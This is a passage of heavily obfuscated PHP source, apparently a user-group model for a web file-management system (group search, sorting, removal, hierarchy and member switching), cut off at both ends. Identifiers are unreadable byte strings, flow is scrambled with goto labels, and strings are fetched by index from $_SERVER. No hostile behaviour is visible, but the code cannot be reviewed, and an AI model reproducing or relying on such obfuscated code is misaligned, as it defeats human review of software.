$E”¸•­ÒÉË) { $E·®ÛÕøˆ˜[] = array($fŠ²öÖ…Íº[1667] => $E”¸•­ÒÉË, $fŠ²öÖ…Íº[92] => $fŠ²öÖ…Íº[705], $fŠ²öÖ…Íº[370] => $A“ê¸«å‘£); } return Model($fŠ²öÖ…Íº[1748])->addAll($E·®ÛÕøˆ˜, array(), !0); goto f˜—›…Ã¬í; bÉ‰ƒºÍ‡º: if ($A“ê¸«å‘£ == $fŠ²öÖ…Íº[86]) { $b±ºÒÖäÂ‹ = $this->parentLevelArray($fŒÑß°‹ñ[$fŠ²öÖ…Íº[481]]); } else { $a‰Ü‡®‚İé = array($fŠ²öÖ…Íº[548] => array($fŠ²öÖ…Íº[507], $fŒÑß°‹ñ[$fŠ²öÖ…Íº[481]] . $fŒÑß°‹ñ[$fŠ²öÖ…Íº[1667]] . $fŠ²öÖ…Íº[508])); $b±ºÒÖäÂ‹ = $this->where($a‰Ü‡®‚İé)->field($fŠ²öÖ…Íº[1667])->select(); $b±ºÒÖäÂ‹ = array_to_keyvalue($b±ºÒÖäÂ‹, $fŠ²öÖ…Íº[33], $fŠ²öÖ…Íº[1667]); } $b±ºÒÖäÂ‹[] = $fŒÑß°‹ñ[$fŠ²öÖ…Íº[1667]]; $E·®ÛÕøˆ˜ = array(); goto BÅ«¯†¶‡Í; cøÑ‡°Ø˜¿: $fŠ²öÖ…Íº =& $_SERVER[¹…ÕÄ]; $fŒÑß°‹ñ = $this->getInfoSimple($E”¸•­ÒÉË); if (!$fŒÑß°‹ñ) { return !1; } goto bÉ‰ƒºÍ‡º; f˜—›…Ã¬í: } protected function groupRemove($aÇËÅ­ãì·) { goto AÉÉ¹¥ô³ô; D–Ó™çÖºŞ: Model($AÉÆ—éóŸ[770])->groupRootRemove($aÇËÅ­ãì·); return $this->where($fñÜàŞ’Äí)->delete(); goto cƒğç®‹ˆ; F¨æ¹º‰Šê: if (!$e±™§çÉ || $e±™§çÉ[$AÉÆ—éóŸ[472]] == 0) { return !1; } $bÏ£ƒ‡†à = $this->getInfoSimple($e±™§çÉ[$AÉÆ—éóŸ[472]]); $this->_changeChildLevel($e±™§çÉ, $bÏ£ƒ‡†à, !0); goto B¸˜‰±ä…È; B¸˜‰±ä…È: $this->where(array($AÉÆ—éóŸ[472] => $aÇËÅ­ãì·))->save(array($AÉÆ—éóŸ[472] => $e±™§çÉ[$AÉÆ—éóŸ[472]])); Model($AÉÆ—éóŸ[1748])->where($fñÜàŞ’Äí)->delete(); Model($AÉÆ—éóŸ[1749])->where($fñÜàŞ’Äí)->delete(); goto D–Ó™çÖºŞ; AÉÉ¹¥ô³ô: $AÉÆ—éóŸ =& $_SERVER[¹…ÕÄ]; $fñÜàŞ’Äí = array($AÉÆ—éóŸ[1667] => $aÇËÅ­ãì·); $e±™§çÉ = $this->where($fñÜàŞ’Äí)->find(); goto F¨æ¹º‰Šê; cƒğç®‹ˆ: } protected function groupSort($E›ÄÛğ«„) { $AåŠî‚•Î² =& $_SERVER[¹…ÕÄ]; $f•æƒééÀ“ = array(); foreach ($E›ÄÛğ«„ as $Eç¥ÜÛ÷î => $CéÛİÔîï½) { $f•æƒééÀ“[] = array($AåŠî‚•Î²[1667], $CéÛİÔîï½, $AåŠî‚•Î²[1690], $Eç¥ÜÛ÷î + 1); } $this->saveAll($f•æƒééÀ“); } public function listData() { $b³ë¹ĞëÌµ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($b³ë¹ĞëÌµ[$_SERVER[¹…ÕÄ][365]]); return $b³ë¹ĞëÌµ; } private function _makeOrder($CÄÔÖêÃ™Æ = '') { goto bšØß¶õ´; Föì±Éó‘: $CÄÔÖêÃ™Æ = $CÄÔÖêÃ™Æ . "{$BÄËŠò¾Œí}\x20{$E¥’Ø¹õŒ™}\x2c\x20\147\x72\157\165\160\111\104\x20\141\163\x63"; return $this->order($CÄÔÖêÃ™Æ); goto eÄÈµ¢÷†Â; f—Êùˆí™: $BÄËŠò¾Œí = Input::get($bìÊÂØìÇ[429], $bìÊÂØìÇ[7], $bìÊÂØìÇ[1671], $dŠˆ©’ôĞ); $E¥’Ø¹õŒ™ = Input::get($bìÊÂØìÇ[430], $bìÊÂØìÇ[7], $bìÊÂØìÇ[1750], array($bìÊÂØìÇ[1750], $bìÊÂØìÇ[424])); $E¥’Ø¹õŒ™ = $Fœ‹¶¿‚…Í[$E¥’Ø¹õŒ™]; goto Föì±Éó‘; bšØß¶õ´: $bìÊÂØìÇ =& $_SERVER[¹…ÕÄ]; $dŠˆ©’ôĞ = array($bìÊÂØìÇ[1667], $bìÊÂØìÇ[28], $bìÊÂØìÇ[1653], $bìÊÂØìÇ[192]); $Fœ‹¶¿‚…Í = array($bìÊÂØìÇ[422] => $bìÊÂØìÇ[423], $bìÊÂØìÇ[424] => $bìÊÂØìÇ[425]); goto f—Êùˆí™; eÄÈµ¢÷†Â: } public function listChild($Eà‘¦ŠíÑ) { $f¶ÆÄ¾«ßÒ =& $_SERVER[¹…ÕÄ]; $dïºŒ¸—öÉ = $this->where(array($f¶ÆÄ¾«ßÒ[472] => $Eà‘¦ŠíÑ))->_makeOrder()->selectPage(200); $this->_listDataApply($dïºŒ¸—öÉ[$f¶ÆÄ¾«ßÒ[365]]); return $dïºŒ¸—öÉ; } public function listByID($EÃÂ¦â™¨ó) { $fÖìÉ³È =& $_SERVER[¹…ÕÄ]; if (!$EÃÂ¦â™¨ó) { return array(); } $b‚âÕÙå¥Ã = array($fÖìÉ³È[1667] => array($fÖìÉ³È[7], $EÃÂ¦â™¨ó)); $CŒ¿»˜Š¾Ì = $this->where($b‚âÕÙå¥Ã)->select(); $this->_listDataApply($CŒ¿»˜Š¾Ì); return $CŒ¿»˜Š¾Ì; } public function listSearch($Fº…¼Œ”Ü) { goto EÓ¿º‹ÈËÙ; f—¢´øá–: return $dñ“Â›âˆâ; goto D¯‚‡ÖÏêŸ; bŸØò é¬ù: $dñ“Â›âˆâ = $dñ“Â›âˆâ ? $dñ“Â›âˆâ : array(); if (!$dñ“Â›âˆâ || count($dñ“Â›âˆâ[$fÄê©½³ŠŞ[365]]) < 5 && Input::check($DæÖ¼›áŞ£, $fÄê©½³ŠŞ[314])) { goto bÕæİ«¸ÊÍ; bÕæİ«¸ÊÍ: $C±š‡“øŠã = $this->groupChildrenAll($cßâ‹”›—Ù); $B¾óĞ†Ù‡Á = $this->_searchFromMeta($fÄê©½³ŠŞ[437], $DæÖ¼›áŞ£, 10, $C±š‡“øŠã); $Dêò¾µ‰Å = $this->_searchFromMeta($fÄê©½³ŠŞ[438], $DæÖ¼›áŞ£, 10, $C±š‡“øŠã); goto eÆâØïÊÆ‡; C¹ƒŠíÈÚ: $dñ“Â›âˆâ[$fÄê©½³ŠŞ[362]][$fÄê©½³ŠŞ[364]] = ceil($dñ“Â›âˆâ[$fÄê©½³ŠŞ[362]][$fÄê©½³ŠŞ[363]] / $dñ“Â›âˆâ[$fÄê©½³ŠŞ[362]][$fÄê©½³ŠŞ[359]]); goto f·Ã—Ã‚¬; eÆâØïÊÆ‡: $fôƒ¡Ë¥ = array_merge($B¾óĞ†Ù‡Á, $Dêò¾µ‰Å, $dñ“Â›âˆâ[$fÄê©½³ŠŞ[365]]); $dñ“Â›âˆâ[$fÄê©½³ŠŞ[365]] = array_unique_by_key($fôƒ¡Ë¥, $fÄê©½³ŠŞ[1667]); $dñ“Â›âˆâ[$fÄê©½³ŠŞ[362]][$fÄê©½³ŠŞ[363]] = count($dñ“Â›âˆâ[$fÄê©½³ŠŞ[365]]); goto C¹ƒŠíÈÚ; f·Ã—Ã‚¬: } $this->_listDataApply($dñ“Â›âˆâ[$fÄê©½³ŠŞ[365]]); goto f—¢´øá–; EÓ¿º‹ÈËÙ: $fÄê©½³ŠŞ =& $_SERVER[¹…ÕÄ]; $DæÖ¼›áŞ£ = $Fº…¼Œ”Ü[$fÄê©½³ŠŞ[1751]]; $cßâ‹”›—Ù = isset($Fº…¼Œ”Ü[$fÄê©½³ŠŞ[1752]]) ? $Fº…¼Œ”Ü[$fÄê©½³ŠŞ[1752]] : !1; goto bò¼¯éñ”¾; FÃÖ‹„«¬î: if ($cßâ‹”›—Ù) { $c°Õä§³²• = $this->getInfoSimple($cßâ‹”›—Ù); $c·îóŸ¿Åâ = $c°Õä§³²•[$fÄê©½³ŠŞ[481]] . $cßâ‹”›—Ù . $fÄê©½³ŠŞ[508]; $D‰¼Áš‡Ôê = array($D‰¼Áš‡Ôê, array($fÄê©½³ŠŞ[481] => array($fÄê©½³ŠŞ[378], $c·îóŸ¿Åâ))); } $D‰¼Áš‡Ôê = $this->parseWhereLike($D‰¼Áš‡Ôê); $dñ“Â›âˆâ = $this->_makeOrder()->where($D‰¼Áš‡Ôê)->selectPage(20); goto bŸØò é¬ù; bò¼¯éñ”¾: if (!trim($DæÖ¼›áŞ£)) { return !1; } $DæÖ¼›áŞ£ = str_replace($fÄê©½³ŠŞ[1753], $fÄê©½³ŠŞ[1754], $DæÖ¼›áŞ£); $D‰¼Áš‡Ôê = array($fÄê©½³ŠŞ[1667] => array($fÄê©½³ŠŞ[378], "{$DæÖ¼›áŞ£}\x25"), $fÄê©½³ŠŞ[28] => array($fÄê©½³ŠŞ[378], "\x25{$DæÖ¼›áŞ£}\x25"), $fÄê©½³ŠŞ[936] => $fÄê©½³ŠŞ[1755]); goto FÃÖ‹„«¬î; D¯‚‡ÖÏêŸ: } protected function groupChildrenAll($fŞÎ·Ï ) { $F‚Ñ”„äåé =& $_SERVER[¹…ÕÄ]; if (!$fŞÎ·Ï ) { return !1; } if (is_string($fŞÎ·Ï )) { $fŞÎ·Ï  = array($fŞÎ·Ï ); } $d‹Õçô´Ú£ = $fŞÎ·Ï ; foreach ($fŞÎ·Ï  as $Aƒ¨óÆ˜¾ª) { $EóÚíôâ±† = $this->getInfoSimple($Aƒ¨óÆ˜¾ª); $fá¡Šº“á = array($F‚Ñ”„äåé[481] => array($F‚Ñ”„äåé[378], $EóÚíôâ±†[$F‚Ñ”„äåé[481]] . $Aƒ¨óÆ˜¾ª . $F‚Ñ”„äåé[508])); $A±îƒ¦î½ = $this->field($F‚Ñ”„äåé[1667])->where($fá¡Šº“á)->select(); $d‹Õçô´Ú£ = array_merge($d‹Õçô´Ú£, array_to_keyvalue($A±îƒ¦î½, $F‚Ñ”„äåé[33], $F‚Ñ”„äåé[1667])); } return array_unique($d‹Õçô´Ú£); } private function _searchFromMeta($b·†ÔÔÒÃ, $E½Àçñ…ò , $dëÁ³÷åĞÄ, $eŒÁ˜˜‚¾) { goto C¥Õİ«¥ÌÚ; B×ù…¹ò : $CÕÆšæ«ê = $this->parseWhereLike($CÕÆšæ«ê); if ($eŒÁ˜˜‚¾) { $CÕÆšæ«ê[$Aîº‰ê‡ÃÉ[1667]] = array($Aîº‰ê‡ÃÉ[7], $eŒÁ˜˜‚¾); } $F¦Şø¸†³¨ = Model($Aîº‰ê‡ÃÉ[1756])->where($CÕÆšæ«ê)->limit($dëÁ³÷åĞÄ)->select(); goto dÂ¤Åœƒ›Æ; C¥Õİ«¥ÌÚ: $Aîº‰ê‡ÃÉ =& $_SERVER[¹…ÕÄ]; $E½Àçñ…ò  = strtolower($E½Àçñ…ò ); $CÕÆšæ«ê = array($Aîº‰ê‡ÃÉ[92] => $b·†ÔÔÒÃ, $Aîº‰ê‡ÃÉ[370] => array($Aîº‰ê‡ÃÉ[378], "\x25{$E½Àçñ…ò }\x25")); goto B×ù…¹ò ; f°ŠÜğ‘¸: if (!$a½°‚±Áº) { return array(); } return $a½°‚±Áº; goto f°­Œ¢¾¡; dÂ¤Åœƒ›Æ: if (!$F¦Şø¸†³¨) { return array(); } $F¦Şø¸†³¨ = array_to_keyvalue($F¦Şø¸†³¨, $Aîº‰ê‡ÃÉ[33], $Aîº‰ê‡ÃÉ[1667]); $a½°‚±Áº = $this->where(array($Aîº‰ê‡ÃÉ[1746] => array($Aîº‰ê‡ÃÉ[7], $F¦Şø¸†³¨)))->select(); goto f°ŠÜğ‘¸; f°­Œ¢¾¡: } protected function _listDataApplyItem($a££®éÒ†) { $b¬Ş®ƒÜàİ = array($a££®éÒ†); $this->_listDataApply($b¬Ş®ƒÜàİ); return $b¬Ş®ƒÜàİ[0]; } protected function _listDataApply(&$bÈ‰¹ôÁÆ) { goto aÙªÀ¿ÆŒ; e‹Í‚¦‘ö°: $this->_listAppendParent($bÈ‰¹ôÁÆ); $this->_listAppendSourceRoot($bÈ‰¹ôÁÆ, $e§Ê‚Ñ„Ú±); goto DˆÉ¸ÌôÃ; e–ÌÃî¼ÔÛ: $this->_listAppendChildren($bÈ‰¹ôÁÆ); $this->_listAppendChildrenMember($bÈ‰¹ôÁÆ); $this->_listAppendMeta($bÈ‰¹ôÁÆ, $e§Ê‚Ñ„Ú±); goto e‹Í‚¦‘ö°; aÙªÀ¿ÆŒ: $Aø¹è¡òŞ =& $_SERVER[¹…ÕÄ]; if (!$bÈ‰¹ôÁÆ) { return; } $e§Ê‚Ñ„Ú± = array_to_keyvalue($bÈ‰¹ôÁÆ, $Aø¹è¡òŞ[33], $Aø¹è¡òŞ[1667]); goto e–ÌÃî¼ÔÛ; DˆÉ¸ÌôÃ: } private function _listAppendChildren(&$eí‘â‡Š‡) { goto bĞàåöî—È; Dİ§ˆììà¼: $FìíˆÔù² = array($bÄèÌ²‹…[472], $bÄèÌ²‹…[1757] => $bÄèÌ²‹…[474]); $cöÚàâˆÍÚ = $this->field($FìíˆÔù²)->where($eéŸ¡ç‡ä)->group($bÄèÌ²‹…[472])->select(); $bÚ«§ááÂŞ = array_to_keyvalue($cöÚàâˆÍÚ, $bÄèÌ²‹…[472], $bÄèÌ²‹…[474]); goto FĞÄßù¿À…; bĞàåöî—È: $bÄèÌ²‹… =& $_SERVER[¹…ÕÄ]; $eôÒÀóô÷¾ = array_to_keyvalue($eí‘â‡Š‡, $bÄèÌ²‹…[33], $bÄèÌ²‹…[1667]); $eéŸ¡ç‡ä = array($bÄèÌ²‹…[472] => array($bÄèÌ²‹…[7], $eôÒÀóô÷¾)); goto Dİ§ˆììà¼; FĞÄßù¿À…: foreach ($eí‘â‡Š‡ as &$C–½¼“Åâ) { $A­ÚÍ×ñíÊ = $C–½¼“Åâ[$bÄèÌ²‹…[1667]]; $C–½¼“Åâ[$bÄèÌ²‹…[1758]] = isset($bÚ«§ááÂŞ[$A­ÚÍ×ñíÊ]) ? intval($bÚ«§ááÂŞ[$A­ÚÍ×ñíÊ]) : !1; } unset($C–½¼“Åâ); goto c‹ˆ½³‘íº; c‹ˆ½³‘íº: } private function _listAppendChildrenMember(&$AÙ©ñ†êİ¶) { goto C”§» İî†; C”§» İî†: $c¯…·ˆ‘Ş¢ =& $_SERVER[¹…ÕÄ]; $AÕùŠ‰°¬Ş = array_to_keyvalue($AÙ©ñ†êİ¶, $c¯…·ˆ‘Ş¢[33], $c¯…·ˆ‘Ş¢[1667]); $f¬ÙˆÊŠé = array($c¯…·ˆ‘Ş¢[1667] => array($c¯…·ˆ‘Ş¢[7], $AÕùŠ‰°¬Ş)); goto b‡ºÒ¡Éåâ; b‡ºÒ¡Éåâ: $e«‚§‹œÅ = array($c¯…·ˆ‘Ş¢[1667], $c¯…·ˆ‘Ş¢[1757] => $c¯…·ˆ‘Ş¢[474]); $eä‹İ†» = Model($c¯…·ˆ‘Ş¢[1749])->field($e«‚§‹œÅ)->where($f¬ÙˆÊŠé)->group($c¯…·ˆ‘Ş¢[1667])->select(); $e–äÊÚ¹Ø¬ = array_to_keyvalue($eä‹İ†», $c¯…·ˆ‘Ş¢[1667], $c¯…·ˆ‘Ş¢[474]); goto eÂ öÏË•×; eÂ öÏË•×: foreach ($AÙ©ñ†êİ¶ as &$b³©‚“Æ÷) { $CĞ¬Üãã = $b³©‚“Æ÷[$c¯…·ˆ‘Ş¢[1667]]; $b³©‚“Æ÷[$c¯…·ˆ‘Ş¢[1759]] = isset($e–äÊÚ¹Ø¬[$CĞ¬Üãã]) ? intval($e–äÊÚ¹Ø¬[$CĞ¬Üãã]) : !1; } unset($b³©‚“Æ÷); goto EÍÎÏ‰Ê”Ç; EÍÎÏ‰Ê”Ç: } private function _listAppendMeta(&$F‚¶©£„õ, $DØåÔ™Üá) { goto aÛåÑßæô; E½Ä™êÖÒ»: foreach ($F‚¶©£„õ as &$B®³ïÑÓîÄ) { $B®³ïÑÓîÄ[$D¢š×á»åŠ[439]] = array(); if (isset($Aë«Èçã[$B®³ïÑÓîÄ[$D¢š×á»åŠ[1667]]])) { $B®³ïÑÓîÄ[$D¢š×á»åŠ[439]] = $Aë«Èçã[$B®³ïÑÓîÄ[$D¢š×á»åŠ[1667]]]; } } unset($B®³ïÑÓîÄ); goto EØ¥ôîç; aÛåÑßæô: $D¢š×á»åŠ =& $_SERVER[¹…ÕÄ]; $E‰ù‰Ä¶ = array($D¢š×á»åŠ[1667] => array($D¢š×á»åŠ[7], $DØåÔ™Üá)); $Aë«Èçã = Model($D¢š×á»åŠ[1748])->where($E‰ù‰Ä¶)->select(); goto EŸ®÷ÀÉä; EŸ®÷ÀÉä: $Aë«Èçã = array_to_keyvalue_group($Aë«Èçã, $D¢š×á»åŠ[1667]); foreach ($Aë«Èçã as &$eËˆ¹·Í) { $eËˆ¹·Í = array_to_keyvalue($eËˆ¹·Í, $D¢š×á»åŠ[92], $D¢š×á»åŠ[370]); } unset($eËˆ¹·Í); goto E½Ä™êÖÒ»; EØ¥ôîç: } protected function parentLevelArray($a·¶“Í£÷Æ) { $CÁ™˜ëÀÁ =& $_SERVER[¹…ÕÄ]; $a·¶“Í£÷Æ = explode($CÁ™˜ëÀÁ[47], trim($a·¶“Í£÷Æ, $CÁ™˜ëÀÁ[47])); $a·¶“Í£÷Æ = array_remove_value($a·¶“Í£÷Æ, $CÁ™˜ëÀÁ[491]); return $a·¶“Í£÷Æ; } private function _listAppendParent(&$fÊäŸ‘õ–®) { goto D”È™‚…ó; dµÎ¬Ô„Ã¾: foreach ($fÊäŸ‘õ–® as &$BÚ¨Òƒ·Å) { $fè…Âé­º = $this->parentLevelArray($BÚ¨Òƒ·Å[$b£°µÅº‚ˆ[481]]); $E§‘³µø¿ = $b£°µÅº‚ˆ[33]; foreach ($fè…Âé­º as $f¸’ªèœÊ => $câ›ÑÓƒ¯) { if ($eˆ±³çáÆ && $f¸’ªèœÊ == 0) { continue; } $E§‘³µø¿ .= $a´©Û½Ô¦Œ[$câ›ÑÓƒ¯] . $b£°µÅº‚ˆ[8]; } if ($fè…Âé­º) { $E§‘³µø¿ .= $BÚ¨Òƒ·Å[$b£°µÅº‚ˆ[28]]; } $BÚ¨Òƒ·Å[$b£°µÅº‚ˆ[485]] = str_replace($b£°µÅº‚ˆ[490], $b£°µÅº‚ˆ[8], $E§‘³µø¿); } unset($BÚ¨Òƒ·Å); goto Cê‘Ç“äÓó; D”È™‚…ó: $b£°µÅº‚ˆ =& $_SERVER[¹…ÕÄ]; $a´©Û½Ô¦Œ = array(); foreach ($fÊäŸ‘õ–® as &$BÚ¨Òƒ·Å) { $a´©Û½Ô¦Œ[$BÚ¨Òƒ·Å[$b£°µÅº‚ˆ[1667]]] = $BÚ¨Òƒ·Å[$b£°µÅº‚ˆ[28]]; $fè…Âé­º = $this->parentLevelArray($BÚ¨Òƒ·Å[$b£°µÅº‚ˆ[481]]); foreach ($fè…Âé­º as $câ›ÑÓƒ¯) { if (!isset($a´©Û½Ô¦Œ[$câ›ÑÓƒ¯])) { $a´©Û½Ô¦Œ[$câ›ÑÓƒ¯] = 0; } } } goto EæÎà™Ğ’ñ; EæÎà™Ğ’ñ: unset($BÚ¨Òƒ·Å); foreach ($a´©Û½Ô¦Œ as $f¸’ªèœÊ => $C³‘‘‡‚µê) { if ($C³‘‘‡‚µê) { continue; } $cß¡„Ïğ®° = $this->getInfoSimple($f¸’ªèœÊ); $a´©Û½Ô¦Œ[$f¸’ªèœÊ] = $cß¡„Ïğ®°[$b£°µÅº‚ˆ[28]]; } $eˆ±³çáÆ = $GLOBALS[$b£°µÅº‚ˆ[6]][$b£°µÅº‚ˆ[87]][$b£°µÅº‚ˆ[1760]]; goto dµÎ¬Ô„Ã¾; Cê‘Ç“äÓó: } private function _listAppendSourceRoot(&$dÖŠìÂ©Ù„, $AÑ­¬¹½Ó·) { goto CˆàÅÓš÷; CˆàÅÓš÷: $eëŠÙêãª´ =& $_SERVER[¹…ÕÄ]; $e÷»Öè…‘ = array($eëŠÙêãª´[398] => SourceModel::TYPE_GROUP, $eëŠÙêãª´[472] => 0, $eëŠÙêãª´[478] => array($eëŠÙêãª´[7], $AÑ­¬¹½Ó·)); $fÒšÙ°ßÈå = $eëŠÙêãª´[1761]; goto dº¨Ìºîé¤; dº¨Ìºîé¤: $d³ÔßæÔ¥ = Model($eëŠÙêãª´[770])->order($eëŠÙêãª´[1762])->field($fÒšÙ°ßÈå)->where($e÷»Öè…‘)->select(); $d³ÔßæÔ¥ = array_to_keyvalue($d³ÔßæÔ¥, $eëŠÙêãª´[478]); $d³ÔßæÔ¥ = array_remove_key($d³ÔßæÔ¥, $eëŠÙêãª´[478]); goto a§¶È•ÉáÈ; a§¶È•ÉáÈ: foreach ($dÖŠìÂ©Ù„ as &$C†“†ëã—) { $C†“†ëã—[$eëŠÙêãª´[84]] = $d³ÔßæÔ¥[$C†“†ëã—[$eëŠÙêãª´[1667]]] ? $d³ÔßæÔ¥[$C†“†ëã—[$eëŠÙêãª´[1667]]] : array(); } unset($C†“†ëã—); goto C‡ŠóÚãğİ; C‡ŠóÚãğİ: } protected function groupMerge($fŸğÌí×é) { $fŸğÌí×é = array_values(array_unique($fŸğÌí×é)); $eÈºèõ¶Ã¤ = array(); for ($C£¸–Òóæ« = 0; $C£¸–Òóæ« < count($fŸğÌí×é); $C£¸–Òóæ«++) { $A¹å¬Î»å— = !1; for ($d¶¾ÆğÇÜ = 0; $d¶¾ÆğÇÜ < count($fŸğÌí×é); $d¶¾ÆğÇÜ++) { if ($C£¸–Òóæ« == $d¶¾ÆğÇÜ) { continue; } if ($this->isParentOf($fŸğÌí×é[$d¶¾ÆğÇÜ], $fŸğÌí×é[$C£¸–Òóæ«])) { $A¹å¬Î»å— = !0; break; } } if (!$A¹å¬Î»å—) { $eÈºèõ¶Ã¤[] = $fŸğÌí×é[$C£¸–Òóæ«]; } } return $eÈºèõ¶Ã¤; } protected function isParentOf($e‹±é£¶õ , $dò¸ƒ¨Ë¢Ã) { goto Aßê³¤ÁÑ†; A‹½ËÌŒ¡å: $dŠÅéÖÈø = $this->getInfoSimple($dò¸ƒ¨Ë¢Ã); $aÜæ¿ÈĞ±ˆ = $Dêˆ¤µ„Çô[$F Ï‘İå¢™[481]] . $e‹±é£¶õ  . $F Ï‘İå¢™[47]; if (substr($dŠÅéÖÈø[$F Ï‘İå¢™[481]], 0, strlen($aÜæ¿ÈĞ±ˆ)) == $aÜæ¿ÈĞ±ˆ) { return !0; } goto eŒĞíİøìÅ; eŒĞíİøìÅ: return !1; goto CÇİ¥•›çš; Aßê³¤ÁÑ†: $F Ï‘İå¢™ =& $_SERVER[¹…ÕÄ]; if (!$e‹±é£¶õ  || !$dò¸ƒ¨Ë¢Ã || $e‹±é£¶õ  == $dò¸ƒ¨Ë¢Ã) { return !1; } $Dêˆ¤µ„Çô = $this->getInfoSimple($e‹±é£¶õ ); goto A‹½ËÌŒ¡å; CÇİ¥•›çš: } public function groupShowRoot($e¨†¶˜‰¤Ô, $e³›é ƒÕÌ = false) { goto eÑôñø„‡á; FÈ¬ê‡§ò°: $a…­¯ËÕèÎ = $this->parentLevelArray($c‰Œä˜Ù[$eÖêøß…ôø[481]]); $AÒ•‡Æ†Œö = array($e¨†¶˜‰¤Ô); if (count($a…­¯ËÕèÎ) == 0) { return $AÒ•‡Æ†Œö; } goto a…âó®–«; a…âó®–«: if ($e³›é ƒÕÌ && count($a…­¯ËÕèÎ) == 1) { return $AÒ•‡Æ†Œö; } if (!$c‰Œä˜Ù[$eÖêøß…ôø[439]] || !isset($c‰Œä˜Ù[$eÖêøß…ôø[439]][$eÖêøß…ôø[1744]]) || $c‰Œä˜Ù[$eÖêøß…ôø[439]][$eÖêøß…ôø[1744]] == $eÖêøß…ôø[1718]) { return $this->groupShowRoot($a…­¯ËÕèÎ[count($a…­¯ËÕèÎ) - 1], $e³›é ƒÕÌ); } if ($c‰Œä˜Ù[$eÖêøß…ôø[439]][$eÖêøß…ôø[1744]] == $eÖêøß…ôø[355]) { $dË‡¶÷¶åŸ = explode($eÖêøß…ôø[47], $c‰Œä˜Ù[$eÖêøß…ôø[439]][$eÖêøß…ôø[1745]]); if ($dË‡¶÷¶åŸ) { $AÒ•‡Æ†Œö = array_merge($AÒ•‡Æ†Œö, $dË‡¶÷¶åŸ); } } goto CĞ‹ù¬Şà; CĞ‹ù¬Şà: return $AÒ•‡Æ†Œö; goto FÈÄâ¦Æèƒ; eÑôñø„‡á: $eÖêøß…ôø =& $_SERVER[¹…ÕÄ]; $c‰Œä˜Ù = $this->getInfo($e¨†¶˜‰¤Ô); if (!$c‰Œä˜Ù) { return array(); } goto FÈ¬ê‡§ò°; FÈÄâ¦Æèƒ: } protected function resetParentLevel() { $FÅ¦Û”‘°â =& $_SERVER[¹…ÕÄ]; $Dó©ÂÚáÛ¨ = $FÅ¦Û”‘°â[1667]; $eßéÊ„—¶ = $this->select(); $eßéÊ„—¶ = array_to_keyvalue($eßéÊ„—¶, $Dó©ÂÚáÛ¨); foreach ($eßéÊ„—¶ as $bª¸ä‰ñÔÕ) { goto e­¥Á¤‹¨; fœ¬Òàğ‘: $d±ÙÌÖ Í [] = 0; $d±ÙÌÖ Í  = $FÅ¦Û”‘°â[47] . implode($FÅ¦Û”‘°â[47], array_reverse($d±ÙÌÖ Í )) . $FÅ¦Û”‘°â[47]; $this->setNamePinyin($bª¸ä‰ñÔÕ[$Dó©ÂÚáÛ¨], $bª¸ä‰ñÔÕ[$FÅ¦Û”‘°â[28]]); goto EµÂ‘Ğƒî®; e­¥Á¤‹¨: $b‚¸ºì“Ğ° = $bª¸ä‰ñÔÕ; $d±ÙÌÖ Í  = array(); while ($b‚¸ºì“Ğ°[$FÅ¦Û”‘°â[472]] != 0) { $d±ÙÌÖ Í [] = $b‚¸ºì“Ğ°[$FÅ¦Û”‘°â[472]]; $b‚¸ºì“Ğ° = $eßéÊ„—¶[$b‚¸ºì“Ğ°[$FÅ¦Û”‘°â[472]]]; } goto fœ¬Òàğ‘; EµÂ‘Ğƒî®: $this->where(array($Dó©ÂÚáÛ¨ => $bª¸ä‰ñÔÕ[$Dó©ÂÚáÛ¨]))->save(array($FÅ¦Û”‘°â[548] => $d±ÙÌÖ Í )); goto c¦ê³œÅˆä; c¦ê³œÅˆä: } return $eßéÊ„—¶; } public function groupNameAuto($e–×±Î–», $B¼”¡´İˆ‚) { $bå¦‡ö˜› =& $_SERVER[¹…ÕÄ]; $b…‘„Œ” = $this->where(array($bå¦‡ö˜›[389] => $e–×±Î–»))->getField($bå¦‡ö˜›[28], !0); if (!$b…‘„Œ” || !in_array($B¼”¡´İˆ‚, $b…‘„Œ”)) { return $B¼”¡´İˆ‚; } for ($fñ±§é‰¯– = 1; $fñ±§é‰¯– <= count($b…‘„Œ”) + 1; $fñ±§é‰¯–++) { $aÇ®šº³æö = $B¼”¡´İˆ‚ . "\50{$fñ±§é‰¯–}\51"; if (!in_array($aÇ®šº³æö, $b…‘„Œ”)) { return $aÇ®šº³æö; } } } public function groupSwitch($Fí©ö®’Ş, $eŞ¯©É«÷) { goto Bğ ¢˜ëù±; AÒİË¸²©Å: $b«ˆœ–ÌÅ¨ = Model($FëÑãÚŞ•[1749])->where($F“à‘ Ê±)->select(); if (!$b«ˆœ–ÌÅ¨) { $b«ˆœ–ÌÅ¨ = array(); } foreach ($b«ˆœ–ÌÅ¨ as $e·ÊÈä¢™¦) { $Cì¥ùˆ¾ç = $e·ÊÈä¢™¦[$FëÑãÚŞ•[1504]]; $F“à‘ Ê± = array($FëÑãÚŞ•[1504] => $Cì¥ùˆ¾ç, $FëÑãÚŞ•[1667] => $eŞ¯©É«÷); $B°‘Í¢•Ó = Model($FëÑãÚŞ•[1749])->where($F“à‘ Ê±)->find(); if (!$B°‘Í¢•Ó) { $Bô¤Ä°º› = array($eŞ¯©É«÷ => $e·ÊÈä¢™¦[$FëÑãÚŞ•[1763]]); Model($FëÑãÚŞ•[501])->userGroupAdd($Cì¥ùˆ¾ç, $Bô¤Ä°º›); } Model($FëÑãÚŞ•[501])->userGroupRemove($Cì¥ùˆ¾ç, $Fí©ö®’Ş); } goto CËÑºŒíÜ²; CËÑºŒíÜ²: $F“à‘ Ê± = array($FëÑãÚŞ•[398] => 2, $FëÑãÚŞ•[472] => 0, $FëÑãÚŞ•[397] => 1, $FëÑãÚŞ•[478] => array($FëÑãÚŞ•[7], array($Fí©ö®’Ş, $eŞ¯©É«÷))); $c™Ş™Å©› = Model($FëÑãÚŞ•[770])->where($F“à‘ Ê±)->field($FëÑãÚŞ•[1764])->select(); $c™Ş™Å©› = array_to_keyvalue($c™Ş™Å©›, $FëÑãÚŞ•[478], $FëÑãÚŞ•[390]); goto CÍ¶£ö¢Õ¢; cöƒ‹»‘Õ®: $this->where(array($FëÑãÚŞ•[472] => $Fí©ö®’Ş))->save(array($FëÑãÚŞ•[472] => $eŞ¯©É«÷)); return !0; goto Câ–èÌ½Ë×; BË¶ÆÀ‡ä: $CîÀËĞâìâ = array_to_keyvalue($CîÀËĞâìâ, $FëÑãÚŞ•[1667]); if (!isset($CîÀËĞâìâ[$Fí©ö®’Ş]) || !isset($CîÀËĞâìâ[$eŞ¯©É«÷]) || 